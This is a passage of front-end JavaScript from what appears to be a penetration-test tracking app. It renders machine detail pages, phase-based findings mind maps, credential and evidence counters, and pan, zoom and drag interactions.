        <svg class="mm-fs-connectors-svg" xmlns="http://www.w3.org/2000/svg"></svg>
        ${fsBlocks.join('')}
        ${renderUnlinkedCreds()}
      </div>
    `;
  } else {
    const items = byPhase[activePhase] || [];
    const col   = phaseColor(activePhase);
    const name  = phaseName(activePhase);

    /* In preview mode, render day-columns (max 5 days);
       older findings become "Archived".
       In fullscreen, keep the full leaf-group tree. */
    const phaseBody = (() => {
      if (!items.length)
        return '<p class="small dim" style="margin:.75rem 0 .25rem">No findings in this phase yet.</p>';

      if (isPreviewMode) {
        const pColor = phaseColor(activePhase);

        /* ---- bucket findings by calendar day ---- */
        const toDay = (stamp) => {
          if (!stamp) return 'unknown';
          const d = new Date(stamp);
          if (isNaN(d)) return 'unknown';
          return d.toISOString().slice(0, 10);          // "YYYY-MM-DD"
        };
        const byDay = {};
        items.forEach(f => {
          const day = toDay(f.created_at);
          if (!byDay[day]) byDay[day] = [];
          byDay[day].push(f);
        });
        // Sort days descending (newest first)
        const sortedDays = Object.keys(byDay).sort((a, b) => (b > a ? 1 : b < a ? -1 : 0));

        const MAX_DAYS = 5;
        const recentDays   = sortedDays.slice(0, MAX_DAYS);
        const archivedDays = sortedDays.slice(MAX_DAYS);
        const archivedFindings = archivedDays.flatMap(d => byDay[d]);

        /* ---- render a finding row ---- */
        const renderItem = (f) => {
          const sColor = sevColor(f.severity);
          const evCount = (f.evidence || []).length;
          const crCount = allCreds.filter(c => c.finding_id === f.id).length;
          const countParts = [];
          if (evCount) countParts.push(`📓 ${evCount}`);
          if (crCount) countParts.push(`🔑 ${crCount}`);
          const countText = countParts.join('  ');
          return `
            <button class="mm-day-item" data-finding-view="${f.id}" type="button" style="--node-sev:${sColor}">
              <span class="mm-day-item-title">${f.title}</span>
              ${countText ? `<span class="mm-day-item-badge">${countText}</span>` : ''}
            </button>`;
        };

        /* ---- format day label ---- */
        const fmtDayLabel = (iso) => {
          if (iso === 'unknown') return 'Unknown';
          const d = new Date(iso + 'T00:00:00');
          const today = new Date(); today.setHours(0,0,0,0);
          const diff = Math.round((today - d) / 86400000);
          const short = d.toLocaleDateString('en-US', { month: 'short', day: 'numeric' });
          if (diff === 0) return `Today · ${short}`;
          if (diff === 1) return `Yesterday · ${short}`;
          return short;
        };

        /* ---- archived bar ---- */
        const archivedBar = archivedFindings.length ? `
          <div class="mm-archived-bar" data-mm-toggle-archived>
            <span class="mm-archived-icon">📦</span>
            <span class="mm-archived-label">Archived Findings</span>
            <span class="mm-archived-count">${archivedFindings.length}</span>
            <span class="mm-archived-chevron">▸</span>
          </div>
          <div class="mm-archived-panel" style="display:none">
            <div class="mm-archived-list">
              ${archivedFindings.map(f => renderItem(f)).join('')}
            </div>
          </div>
        ` : '';

        /* ---- day columns ---- */
        const dayColumns = recentDays.map(day => {
          const dayFindings = byDay[day];
          return `
            <div class="mm-day-col">
              <div class="mm-day-col-header">
                <span class="mm-day-col-label">${fmtDayLabel(day)}</span>
                <span class="mm-day-col-count">${dayFindings.length}</span>
              </div>
              <div class="mm-lane-scroll-wrap">
                <button class="mm-lane-arrow mm-lane-arrow--up" type="button" aria-label="Scroll up">&#x25B2;</button>
                <div class="mm-day-col-body">
                  ${dayFindings.map(f => renderItem(f)).join('')}
                </div>
                <button class="mm-lane-arrow mm-lane-arrow--down" type="button" aria-label="Scroll down">&#x25BC;</button>
              </div>
            </div>`;
        }).join('');

        return `
          ${archivedBar}
          <div class="mm-day-grid" style="--phase-col:${pColor};--day-cols:${recentDays.length}">
            ${dayColumns}
          </div>`;
      }

      /* fullscreen: full tree */
      return `<div class="mm-single-leaves">${items.map(f => renderLeafGroup(f)).join('')}</div>`;
    })();

    canvasContent = `
      <div class="mm-single-phase" style="--phase-col:${col}">
        <div class="mm-phase-big-header" style="color:${col}">
          <span class="mm-phase-big-dot" style="background:${col};box-shadow:0 0 12px ${col}88"></span>
          ${name}
        </div>
        ${phaseBody}
        ${renderUnlinkedCreds()}
      </div>
    `;
  }

  return `
    <div class="machine-mindmap" id="mm-container-${machine.id}">
      ${filterBar}
      <div class="mm-viewport" id="${vpId}">
        <div class="mm-pan-canvas" id="${canvasId}">${canvasContent}</div>
      </div>
    </div>
  `;
}

function renderMachineDetail(machine) {
  const progress = getTotalProgress(machine);
  const recentActivity = machineActivity(machine.id).slice(0, 20);
  const checklistNavPhases = checklistPhasesFor(machine);

  const tabContent = renderChecklist(machine);
  state.ui.machineTab = 'checklist';

  return `
    <section>
      <button class="btn btn-ghost" id="backToDashboard">← Back to Dashboard</button>
      <div class="machine-top">
        <div>
          <div class="machine-title-row">
            <h1 class="mono" style="font-size:3.1rem">🖥 ${machine.ip}</h1>
          </div>
          <p class="small machine-created mono">Created: ${formatDate(machine.created_at)}</p>
        </div>
        <div class="machine-controls">
          <div class="status-row">
            <span class="status-label">STATUS:</span>
            <select id="machineStatus">
              <option value="pending" ${machine.status === 'pending' ? 'selected' : ''}>None</option>
              <option value="scanning" ${machine.status === 'scanning' ? 'selected' : ''}>Initial Recon</option>
              <option value="user_shell" ${machine.status === 'user_shell' ? 'selected' : ''}>Low-Level Exploited</option>
              <option value="root_shell" ${machine.status === 'root_shell' ? 'selected' : ''}>Root-Level Exploited</option>
              <option value="completed" ${machine.status === 'completed' ? 'selected' : ''}>Completed</option>
            </select>
          </div>
          <div class="progress-row">
            <span class="small checklist-progress-label">Checklist Progress</span>
            <div class="progress-inline">
              <div class="progress-bar" style="width:110px"><div class="progress-fill" style="width:${progress}%"></div></div>
              <span class="mono" style="color:var(--green)">${progress}%</span>
            </div>
          </div>
          <div class="machine-right-meta">
            <p class="small mono machine-meta-line">Operating System: ${machine.os_type === 'windows' ? 'Windows' : 'Linux'}</p>
            <p class="small mono machine-meta-line">Domain Name: ${machine.hostname || '-'}</p>
          </div>
        </div>
      </div>

      <div class="mm-section-title" id="mm-viewport-${machine.id}">
        <span class="mm-section-icon">⬡</span>
        <span class="mm-section-label">MIND MAP</span>
        <span class="mm-section-line"></span>
      </div>
      ${renderMachineMindMap(machine)}

      <div class="machine-content-layout">
        <div class="machine-main">${tabContent}</div>
        <aside class="machine-side sticky-side">
          <div class="tabs tabs-vertical sticky-tabs">
            <button class="tab" id="scrollToMindMap">🌐 Mind Map</button>
            <button class="tab" id="openCredModalTab">🔑 Credentials (${machineCredentials(machine.id).length})</button>
            <button class="tab" id="openFindingsModalTab">🔍 Findings (${machineFindings(machine.id).length})</button>
            <button class="tab" id="openEvidenceModalTab">📓 Evidence (${machineEvidenceCount(machine.id)})</button>
            <button class="tab" id="openNotesModalTab">📝 Notes</button>
          </div>
          ${state.ui.machineTab === 'checklist' ? `
            <div class="section-toc">
              <div class="small dim">Sections</div>
              <div class="section-toc-list">
                ${checklistNavPhases.map((phase) => {
                  const expanded = state.ui.openPhases.includes(phase.id);
                  const completedSet = new Set(machine.completed_items || []);
                  return `
                    <div class="section-toc-group">
                      <button class="section-toc-link${expanded ? ' expanded' : ''}" data-phase-toggle="${phase.id}" type="button" style="color:${phaseColor(phase.id)}">${phase.name} <span class="chevron">${expanded ? '▼' : '▶'}</span></button>
                      <div class="section-toc-sublist" style="display:${expanded ? 'block' : 'none'}">
                        ${phase.items.map((item) => `
                          <button class="section-toc-task${completedSet.has(item.id) ? ' completed' : ''}" data-task-jump="${item.id}" data-task-phase="${phase.id}" data-task-link="${item.id}" type="button">${item.name}</button>
                        `).join('')}
                      </div>
                    </div>
                  `;
                }).join('')}
              </div>
            </div>
          ` : ''}
        </aside>
      </div>

      ${recentActivity.length ? `
        <div class="recent-box">
          <h3 class="subhead">Recent Activity</h3>
          <div class="recent-scroll">
            ${recentActivity.map((entry) => `<div class="recent-row"><span class="small mono dim">${formatTime(entry.timestamp)}</span><span class="badge mono">${formatActionLabel(entry.action)}</span><span class="small">${entry.details}</span></div>`).join('')}
          </div>
        </div>
      ` : ''}
    </section>
  `;
}

function mount() {
  setNav();
  document.body.classList.remove('mm-fs-active');
  mmFsMachineId = null;
  document.querySelectorAll('dialog[open]').forEach((dialogEl) => {
    try { dialogEl.close(); } catch {}
    dialogEl.removeAttribute('open');
  });
  releaseModalLocks();
  const path = routePath();
  const machineId = parseMachineRoute(path);

  if (machineId) {
    const machine = machineById(machineId);
    if (!machine) {
      main.innerHTML = '<div class="empty"><h3>Machine not found</h3><a href="#/" class="btn btn-ghost">Go Back</a></div>';
      return;
    }
    main.innerHTML = renderMachineDetail(machine);
    wireMachineDetail(machine);
    persist();
    return;
  }

  if (path.startsWith('/credentials')) {
    window.location.hash = '#/';
    return;
  }

  if (path.startsWith('/tools') || path.startsWith('/mindmap')) {
    window.location.hash = '#/';
    return;
  }

  if (path.startsWith('/timeline')) {
    main.innerHTML = renderTimeline();
    persist();
    return;
  }

  main.innerHTML = renderDashboard();
  wireDashboard();
  updateStorageMeters();
  persist();
}

function showDialogSafely(modal) {
  if (!modal) return;

  const lockBackgroundScroll = () => {
    if (isMainScrollLocked) return;
    isMainScrollLocked = true;

    document.body.classList.add('modal-active');
    document.documentElement.classList.add('modal-active');
    document.documentElement.style.overflow = 'hidden';
    document.body.style.overflow = 'hidden';

    if (main) {
      mainScrollLockTop = main.scrollTop;
      main.style.overflow = 'hidden';
      mainScrollLockHandler = () => {
        if (!isMainScrollLocked || !main) return;
        if (main.scrollTop !== mainScrollLockTop) {
          main.scrollTop = mainScrollLockTop;
        }
      };
      main.addEventListener('scroll', mainScrollLockHandler, { passive: true });
    }
  };

  const unlockBackgroundScroll = () => {
    if (!isMainScrollLocked) return;
    releaseModalLocks();
    if (main) main.scrollTop = mainScrollLockTop;
  };

  const syncModalBodyState = () => {
    const anyOpen = document.querySelectorAll('dialog[open]').length > 0;
    if (anyOpen) lockBackgroundScroll();
    else unlockBackgroundScroll();
  };

  if (modal.open) {
    try { modal.close(); } catch {}
  }

  lockBackgroundScroll();

  try {
    modal.showModal();
  } catch {
    unlockBackgroundScroll();
    return;
  }
  syncModalBodyState();

  const onClose = () => {
    syncModalBodyState();
    modal.removeEventListener('close', onClose);
  };

  modal.addEventListener('close', onClose);
}

function wireDashboard() {
  document.getElementById('openMachineModal')?.addEventListener('click', () => {
    fillMachineSelect();
    showDialogSafely(document.getElementById('machineModal'));
  });

  document.getElementById('resetMachinesBtn')?.addEventListener('click', async () => {
    if (!state.machines.length) return;
    const confirmed = window.confirm('Reset all machines and related data? This cannot be undone.');
    if (!confirmed) return;

    await clearEvidenceStore();

    state.machines = [];
    state.credentials = [];
    state.findings = [];
    state.activities = [];
    state.reveal = {};
    state.ui.machineTab = 'checklist';
    state.ui.showAddMachineCred = false;
    state.ui.showAddFinding = false;
    mount();
  });

  main.querySelectorAll('.machine-card').forEach((card) => {
    card.addEventListener('click', (event) => {
      if (event.target.closest('[data-delete-machine]')) return;
      window.location.hash = `#/machine/${card.dataset.machineId}`;
    });
  });

  main.querySelectorAll('[data-delete-machine]').forEach((button) => {
    button.addEventListener('click', (event) => {
      event.stopPropagation();
      const id = button.dataset.deleteMachine;
      const machine = machineById(id);
      if (!machine) return;
      const removedCreds = state.credentials.filter((credential) => credential.machine_id === id).length;
      const removedFindings = state.findings.filter((finding) => finding.machine_id === id).length;
      state.credentials = state.credentials.filter((credential) => credential.machine_id !== id);
      state.findings = state.findings.filter((finding) => finding.machine_id !== id);
      state.activities = state.activities.filter((activity) => activity.machine_id !== id);
      state.machines = state.machines.filter((entry) => entry.id !== id);
      addActivity('updated_machine', `Deleted machine ${machine.ip}; removed ${removedCreds} credential(s) and ${removedFindings} finding(s)`, id);
      mount();
    });
  });
}

function wireCredentials() {
  const search = document.getElementById('credSearch');
  renderCredentialRows();

  search.addEventListener('input', (event) => {
    renderCredentialRows(event.target.value);
  });

  document.getElementById('openCredModal')?.addEventListener('click', () => {
    fillMachineSelect();
    showDialogSafely(document.getElementById('credModal'));
  });

  document.getElementById('credTable').addEventListener('click', async (event) => {
    const button = event.target.closest('button[data-action]');
    if (!button) return;
    const id = button.dataset.id;
    const action = button.dataset.action;
    const credential = state.credentials.find((entry) => entry.id === id);
    if (!credential) return;

    if (action === 'reveal') {
      state.reveal[id] = !state.reveal[id];
      renderCredentialRows(search.value);
      persist();
      return;
    }

    if (action === 'copy') {
      await navigator.clipboard.writeText(credential.password || '');
      showCopyFeedback(button, 'Copied!');
      return;
    }

    if (action === 'delete') {
      state.credentials = state.credentials.filter((entry) => entry.id !== id);
      addActivity('updated_machine', `Deleted credential: ${credential.username}`, credential.machine_id);
      renderCredentialRows(search.value);
      persist();
    }
  });
}

function wireMindMap() {
  renderMindMapBody();
  document.querySelectorAll('[data-mode]').forEach((button) => {
    button.addEventListener('click', () => {
      state.ui.mindmapMode = button.dataset.mode;
      mount();
    });
  });
}

function wireMMFullscreenBtn(machine, mmEl) {
  const fsBtn = mmEl.querySelector('#mm-fs-' + machine.id);
  if (!fsBtn) return;
  if (mmEl._fsCleanup) { mmEl._fsCleanup(); delete mmEl._fsCleanup; }

  const syncBtn = () => {
    const isFs = mmEl.classList.contains('mm-inline-fullscreen');
    fsBtn.innerHTML = isFs ? 'Exit Full-Screen &#x2B1B;' : 'Full-Screen &#x26F6;';
    fsBtn.title = isFs ? 'Exit Full-Screen' : 'Full-Screen';
  };

  const closeInlineFullscreen = () => {
    if (mmFsMachineId !== machine.id) return;
    const restoreY = mmEl._savedScrollY || 0;
    mmEl.classList.remove('mm-inline-fullscreen');
    document.body.classList.remove('mm-fs-active');
    mmFsMachineId = null;
    state.ui.mmPhase = 'all';
    syncBtn();
    refreshMindMapInPlace(machine);
    /* Restore scroll position after layout settles */
    requestAnimationFrame(() => {
      const mainEl = document.getElementById('main');
      if (mainEl) { mainEl.scrollTop = restoreY; }
      requestAnimationFrame(() => {
        if (mainEl) { mainEl.scrollTop = restoreY; }
      });
    });
  };

  const openInlineFullscreen = () => {
    const mainEl = document.getElementById('main');
    mmEl._savedScrollY = mainEl ? mainEl.scrollTop : 0;
    document.querySelectorAll('.machine-mindmap.mm-inline-fullscreen').forEach(el => {
      el.classList.remove('mm-inline-fullscreen');
    });
    mmEl.classList.add('mm-inline-fullscreen');
    document.body.classList.add('mm-fs-active');
    mmFsMachineId = machine.id;
    state.ui.mmPhase = 'all';
    syncBtn();
    refreshMindMapInPlace(machine);
  };

  const onToggleClick = () => {
    if (mmEl.classList.contains('mm-inline-fullscreen')) closeInlineFullscreen();
    else openInlineFullscreen();
  };

  const onEsc = (event) => {
    if (event.key === 'Escape' && mmEl.classList.contains('mm-inline-fullscreen')) {
      closeInlineFullscreen();
    }
  };

  fsBtn.addEventListener('click', onToggleClick);
  window.addEventListener('keydown', onEsc);
  syncBtn();

  mmEl._fsCleanup = () => {
    fsBtn.removeEventListener('click', onToggleClick);
    window.removeEventListener('keydown', onEsc);
  };
}

function refreshMindMapInPlace(machine) {
  const mmEl = document.getElementById('mm-container-' + machine.id);
  if (!mmEl) { mount(); return; }
  /* Parse the new markup, extract inner HTML only so the container
     element (= the fullscreen element) is never replaced */
  const tmp = document.createElement('div');
  tmp.innerHTML = renderMachineMindMap(machine).trim();
  const newInner = tmp.firstElementChild;
  mmEl.innerHTML = newInner ? newInner.innerHTML : '';
  /* Re-wire phase buttons */
  mmEl.querySelectorAll('[data-mm-phase]').forEach(btn => {
    btn.addEventListener('click', () => {
      state.ui.mmPhase = btn.dataset.mmPhase;
      if (mmFsMachineId === machine.id) { refreshMindMapInPlace(machine); }
      else { mount(); }
    });
  });
  wireMindMapPanZoom(machine);
  wireMMFullscreenBtn(machine, mmEl);
  /* Re-wire finding clicks */
  mmEl.querySelectorAll('[data-finding-view]').forEach(el => {
    el.addEventListener('click', () => openFindingEditModal(el.dataset.findingView));
  });
  /* Re-wire archived toggle */
  mmEl.querySelectorAll('[data-mm-toggle-archived]').forEach(bar => {
    bar.addEventListener('click', () => {
      const panel = bar.nextElementSibling;
      if (!panel) return;
      const open = panel.style.display !== 'none';
      panel.style.display = open ? 'none' : 'block';
      const chevron = bar.querySelector('.mm-archived-chevron');
      if (chevron) chevron.textContent = open ? '▸' : '▾';
      bar.classList.toggle('mm-archived-bar--open', !open);
    });
  });
  /* Re-wire lane scroll arrows */
  wireLaneScrollArrows(mmEl);
  /* Draw leaf connectors (parent→child, finding→credential) */
  drawLeafConnectors(mmEl);
  /* Wire draggable blocks in fullscreen (also draws cross-phase arrows after layout) */
  wireFsBlockDrag(mmEl, machine);
}

function wireLaneScrollArrows(root) {
  root.querySelectorAll('.mm-lane-scroll-wrap').forEach(wrap => {
    const body    = wrap.querySelector('.mm-phase-lane-body') || wrap.querySelector('.mm-day-col-body');
    const arrowUp = wrap.querySelector('.mm-lane-arrow--up');
    const arrowDn = wrap.querySelector('.mm-lane-arrow--down');
    if (!body || !arrowUp || !arrowDn) return;

    const SCROLL_STEP = 80; // px per click

    const sync = () => {
      const hasOverflow = body.scrollHeight > body.clientHeight + 2;
      const atTop    = body.scrollTop <= 1;
      const atBottom = body.scrollTop + body.clientHeight >= body.scrollHeight - 1;
      // Dim arrows that can't scroll further; fully hide both if no overflow at all
      arrowUp.classList.toggle('mm-lane-arrow--disabled', !hasOverflow || atTop);
      arrowDn.classList.toggle('mm-lane-arrow--disabled', !hasOverflow || atBottom);
      wrap.classList.toggle('mm-lane-scroll-wrap--no-overflow', !hasOverflow);
    };

    arrowUp.addEventListener('click', (e) => { e.stopPropagation(); body.scrollBy({ top: -SCROLL_STEP, behavior: 'smooth' }); });
    arrowDn.addEventListener('click', (e) => { e.stopPropagation(); body.scrollBy({ top:  SCROLL_STEP, behavior: 'smooth' }); });
    body.addEventListener('scroll', sync, { passive: true });

    // Initial sync after a tick (layout needs to settle)
    requestAnimationFrame(sync);
  });
}

/* ── Draw SVG arrows for cross-phase parent links (fullscreen only) ──
 *  SYNCHRONOUS — must be called after layout is ready (inside rAF or
 *  after repositionFsBlocks).  Uses getBoundingClientRect subtraction
 *  so it is immune to CSS transforms on the pan-canvas.
 */
function drawCrossPhaseArrows(mmEl, machine) {
  // Remove existing overlay
  mmEl.querySelectorAll('.mm-xphase-svg').forEach(el => el.remove());

  /* works in both default and fullscreen modes — just needs mm-fs-workspace */

  const allFindings = machineFindings(machine.id);
  const canvasEl = document.getElementById('mm-canvas-' + machine.id);
  if (!canvasEl) return;

  const workspace = canvasEl.querySelector('.mm-fs-workspace');
  if (!workspace) return;

  // Find cross-phase links: child is in a different phase than its parent
  const crossLinks = [];
  allFindings.forEach(child => {
    if (!child.parent_id) return;
    const parent = allFindings.find(p => p.id === child.parent_id);
    if (!parent || parent.phase === child.phase) return;
    crossLinks.push({ parentId: parent.id, childId: child.id });
  });

  if (!crossLinks.length) return;

  // Create SVG overlay
  const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
  svg.classList.add('mm-xphase-svg');
  svg.setAttribute('xmlns', 'http://www.w3.org/2000/svg');
  workspace.appendChild(svg);

  /*
   * Use getBoundingClientRect subtraction: both workspace and nodes live
   * inside the same transformed pan-canvas, so subtracting the workspace
   * rect from the node rect cancels the transform.  Divide by scale to
   * convert screen-space deltas back to CSS-pixel coords for the SVG.
   */
  const wsRect = workspace.getBoundingClientRect();
  const scale  = wsRect.width / (workspace.offsetWidth || 1) || 1;

  let maxX = 0, maxY = 0;

  crossLinks.forEach(link => {
    const parentNode = workspace.querySelector(`[data-mm-fid="${link.parentId}"] > .mm-node`);
    const childNode  = workspace.querySelector(`[data-mm-fid="${link.childId}"] > .mm-node`);
    if (!parentNode || !childNode) return;

    const pr = parentNode.getBoundingClientRect();
    const cr = childNode.getBoundingClientRect();

    /* Positions relative to workspace, in CSS pixels */
    const x1 = (pr.right - wsRect.left) / scale;
    const y1 = ((pr.top + pr.height / 2) - wsRect.top) / scale;
    const x2 = (cr.left - wsRect.left) / scale;
    const y2 = ((cr.top + cr.height / 2) - wsRect.top) / scale;

    /* Smooth cubic bezier curve with looping arc */
    const dy = y2 - y1;
    const dx = Math.abs(x2 - x1) || 60;
    const arcDist = Math.max(Math.min(Math.abs(dy) * 0.4, 80), 30);
    const arcDir  = dy >= 0 ? 1 : -1;

    const cx1 = x1 + dx * 0.25;
    const cy1 = y1 + arcDist * arcDir;
    const cx2 = x2 - dx * 0.25;
    const cy2 = y2 + arcDist * arcDir;

    const path = document.createElementNS('http://www.w3.org/2000/svg', 'path');
    path.setAttribute('d', `M ${x1} ${y1} C ${cx1} ${cy1}, ${cx2} ${cy2}, ${x2} ${y2}`);
    path.setAttribute('fill', 'none');
    path.setAttribute('stroke', '#22c55e');
    path.setAttribute('stroke-width', '2');
    path.setAttribute('stroke-dasharray', '8 4');
    path.classList.add('mm-xphase-line');
    svg.appendChild(path);

    maxX = Math.max(maxX, x1, x2 + 10, cx1, cx2);
    maxY = Math.max(maxY, y1 + 10, y2 + 10, Math.abs(cy1) + 10, Math.abs(cy2) + 10);
  });

  svg.setAttribute('width', maxX + 40);
  svg.setAttribute('height', maxY + 40);
  svg.style.width  = (maxX + 40) + 'px';
  svg.style.height = (maxY + 40) + 'px';
}

/* ── Draw SVG connector curves for parent→child and finding→credential links ── */
function drawLeafConnectors(root) {
  root.querySelectorAll('.mm-leaf-conn-svg').forEach(el => el.remove());

  requestAnimationFrame(() => {
    root.querySelectorAll('.mm-leaf-row').forEach(row => {
      const parentNode = row.querySelector(':scope > .mm-node');
      if (!parentNode) return;

      const leaves    = row.querySelector(':scope > .mm-leaves');
      const credChain = row.querySelector(':scope > .mm-cred-chain');
      if (!leaves && !credChain) return;

      row.style.position = 'relative';
      const rowRect = row.getBoundingClientRect();
      const scale   = rowRect.width / (row.offsetWidth || 1) || 1;

      const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
      svg.classList.add('mm-leaf-conn-svg');

      let paths = '';
      const pr = parentNode.getBoundingClientRect();
      const x1 = (pr.right - rowRect.left) / scale;
      const y1 = ((pr.top + pr.height / 2) - rowRect.top) / scale;

      /* parent → children curves */
      if (leaves) {
        leaves.querySelectorAll(':scope > .mm-leaf-row').forEach(childRow => {
          const childNode = childRow.querySelector(':scope > .mm-node');
          if (!childNode) return;
          const cr = childNode.getBoundingClientRect();
          const x2 = (cr.left - rowRect.left) / scale;
          const y2 = ((cr.top + cr.height / 2) - rowRect.top) / scale;
          const mx = (x1 + x2) / 2;
          paths += `<path d="M ${x1} ${y1} C ${mx} ${y1}, ${mx} ${y2}, ${x2} ${y2}" class="mm-leaf-conn-child"/>`;
        });
      }

      /* finding → credential curves */
      if (credChain) {
        credChain.querySelectorAll(':scope > .mm-cred-blob').forEach(blob => {
          const cr = blob.getBoundingClientRect();
          const x2 = (cr.left - rowRect.left) / scale;
          const y2 = ((cr.top + cr.height / 2) - rowRect.top) / scale;
          const mx = (x1 + x2) / 2;
          paths += `<path d="M ${x1} ${y1} C ${mx} ${y1}, ${mx} ${y2}, ${x2} ${y2}" class="mm-leaf-conn-cred"/>`;
        });
      }

      svg.innerHTML = paths;
      const w = row.scrollWidth;
      const h = row.scrollHeight;
      svg.setAttribute('width', w);
      svg.setAttribute('height', h);
      svg.style.width  = w + 'px';
      svg.style.height = h + 'px';
      row.appendChild(svg);
    });
  });
}

/* ── Reposition fullscreen blocks based on actual rendered sizes ── */
function repositionFsBlocks(workspace) {
  if (!workspace) return;
  const PHASE_SEQ = ['osint', 'recon', 'exploitation', 'post_exploitation', 'persistence'];
  /* Include any extra phase blocks present in the DOM */
  workspace.querySelectorAll('[data-mm-drag-block]').forEach(b => {
    const pid = b.dataset.mmDragBlock;
    if (!PHASE_SEQ.includes(pid)) PHASE_SEQ.push(pid);
  });
  const GAP = 60;
  let x = 20;
  PHASE_SEQ.forEach((pid, i) => {
    const block = workspace.querySelector(`[data-mm-drag-block="${pid}"]`);
    if (!block) return;
    block.style.left = x + 'px';
    block.style.top  = (40 + (i % 2) * 30) + 'px';
    x += (block.offsetWidth || 280) + GAP;
  });
  /* Grow workspace to fit */
  workspace.style.minWidth = (x + 40) + 'px';
}

/* ── Draggable free-form blocks for fullscreen ── */
function wireFsBlockDrag(mmEl, machine) {
  const workspace = mmEl.querySelector('.mm-fs-workspace');
  if (!workspace) return;

  /* Get current canvas scale to compensate drag deltas */
  const canvasEl = workspace.closest('.mm-pan-canvas');
  function getCanvasScale() {
    if (!canvasEl) return 1;
    const m = canvasEl.style.transform.match(/scale\(([\d.]+)\)/);
    return m ? parseFloat(m[1]) || 1 : 1;
  }

  const blocks = workspace.querySelectorAll('[data-mm-drag-block]');
  blocks.forEach(block => {
    const handle = block.querySelector('[data-mm-drag-handle]');
    if (!handle) return;

    let dragging = false, startX = 0, startY = 0, origLeft = 0, origTop = 0;

    handle.style.cursor = 'grab';

    const onDown = (e) => {
      e.preventDefault();
      e.stopPropagation();
      dragging = true;
      startX = e.clientX;
      startY = e.clientY;
      origLeft = parseInt(block.style.left) || 0;
      origTop  = parseInt(block.style.top)  || 0;
      handle.style.cursor = 'grabbing';
      block.style.zIndex = '50';
      window.addEventListener('mousemove', onMove);
      window.addEventListener('mouseup', onUp);
    };

    const onMove = (e) => {
      if (!dragging) return;
      const s  = getCanvasScale();
      const dx = (e.clientX - startX) / s;
      const dy = (e.clientY - startY) / s;
      block.style.left = (origLeft + dx) + 'px';
      block.style.top  = (origTop  + dy) + 'px';
      updateFsConnectors(workspace);
      drawCrossPhaseArrows(mmEl, machine);
    };

    const onUp = () => {
      dragging = false;
      handle.style.cursor = 'grab';
      block.style.zIndex = '';
      window.removeEventListener('mousemove', onMove);
      window.removeEventListener('mouseup', onUp);
    };

    handle.addEventListener('mousedown', onDown);
  });

  /* Reposition blocks based on actual sizes, then draw connectors */
  requestAnimationFrame(() => {
    repositionFsBlocks(workspace);
    updateFsConnectors(workspace);
    drawCrossPhaseArrows(mmEl, machine);
  });
}

/* Position the SVG connector lines between adjacent phase blocks */
function updateFsConnectors(workspace) {
  if (!workspace) return;
  const svg = workspace.querySelector('.mm-fs-connectors-svg');
  if (!svg) return;

  const PHASE_SEQ = ['osint', 'recon', 'exploitation', 'post_exploitation', 'persistence'];
  /* Include any extra phase blocks present in the DOM */
  workspace.querySelectorAll('[data-mm-drag-block]').forEach(b => {
    const pid = b.dataset.mmDragBlock;
    if (!PHASE_SEQ.includes(pid)) PHASE_SEQ.push(pid);
  });

  /* Gather block positions */
  const blocks = {};
  workspace.querySelectorAll('[data-mm-drag-block]').forEach(b => {
    const pid = b.dataset.mmDragBlock;
    blocks[pid] = {
      left: parseInt(b.style.left) || 0,
      top:  parseInt(b.style.top)  || 0,
      w:    b.offsetWidth  || 280,
      h:    b.offsetHeight || 120,
    };
  });

  let paths = '';
  let maxW = 0, maxH = 0;

  for (let i = 0; i < PHASE_SEQ.length - 1; i++) {
    const from = blocks[PHASE_SEQ[i]];
    const to   = blocks[PHASE_SEQ[i + 1]];
    if (!from || !to) continue;

    const x1 = from.left + from.w;
    const y1 = from.top  + from.h / 2;
    const x2 = to.left;
    const y2 = to.top + to.h / 2;
    const mx = (x1 + x2) / 2;

    paths += `<path d="M ${x1} ${y1} C ${mx} ${y1}, ${mx} ${y2}, ${x2} ${y2}"
      fill="none" stroke="rgba(148,163,184,.38)" stroke-width="2"
      stroke-dasharray="6 4" class="mm-conn-path"/>`;

    maxW = Math.max(maxW, x1, x2 + 10);
    maxH = Math.max(maxH, y1, y2 + 10);
  }

  svg.innerHTML = paths;

  svg.setAttribute('width',  maxW + 40);
  svg.setAttribute('height', maxH + 40);
  svg.style.width  = (maxW + 40) + 'px';
  svg.style.height = (maxH + 40) + 'px';
}

function wireMindMapPanZoom(machine) {
  if (mmPanCleanup) { mmPanCleanup(); mmPanCleanup = null; }
  const vpEl     = document.getElementById('mm-vp-'     + machine.id);
  const canvasEl = document.getElementById('mm-canvas-' + machine.id);
  const mmEl     = document.getElementById('mm-container-' + machine.id);
  if (!vpEl || !canvasEl || !mmEl) return;

  const zoomResetBtn = document.getElementById('mm-zoom-reset-' + machine.id);

  const syncZoomControls = () => {
    if (zoomResetBtn) zoomResetBtn.disabled = false;
  };

  let tx = 0, ty = 0, scale = 1;
  let dragging = false, startX = 0, startY = 0, startTx = 0, startTy = 0;

  canvasEl.style.transformOrigin = '0 0';

  function applyTransform() {
    canvasEl.style.transform = `translate(${tx}px,${ty}px) scale(${scale})`;
  }

  function onMouseDown(e) {
    if (e.button !== 0) return;
    if (e.target.closest('[data-finding-view],[data-mm-phase],.mm-zoom-btn,.mm-fs-btn,[data-mm-drag-handle]')) return;
    dragging = true;
    startX = e.clientX; startY = e.clientY;
    startTx = tx; startTy = ty;
    vpEl.style.cursor = 'grabbing';
    e.preventDefault();
  }

  function onMouseMove(e) {
    if (!dragging) return;
    tx = startTx + (e.clientX - startX);
    ty = startTy + (e.clientY - startY);
    applyTransform();
  }

  function onMouseUp() {
    if (dragging) {
      dragging = false;
      vpEl.style.cursor = '';
    }
  }

  function onWheel(e) {
    e.preventDefault();
    const factor  = e.deltaY < 0 ? 1.1 : 1 / 1.1;
    const rect    = vpEl.getBoundingClientRect();
    const mx      = e.clientX - rect.left - tx;
    const my      = e.clientY - rect.top  - ty;
    const newScale = Math.max(0.15, Math.min(4, scale * factor));
    const ratio    = newScale / scale;
    tx -= mx * (ratio - 1);
    ty -= my * (ratio - 1);
    scale = newScale;
    applyTransform();
  }

  zoomResetBtn?.addEventListener('click', () => {
    tx = 0;
    ty = 0;
    scale = 1;
    applyTransform();
    vpEl.scrollTo({ top: 0, left: 0, behavior: 'smooth' });
    /* Re-position blocks to their default layout */
    const workspace = mmEl.querySelector('.mm-fs-workspace');
    if (workspace) {
      repositionFsBlocks(workspace);
      updateFsConnectors(workspace);
      drawCrossPhaseArrows(mmEl, machine);
    }
  });

  vpEl.style.userSelect = 'none';
  vpEl.addEventListener('mousedown', onMouseDown);
  window.addEventListener('mousemove', onMouseMove);
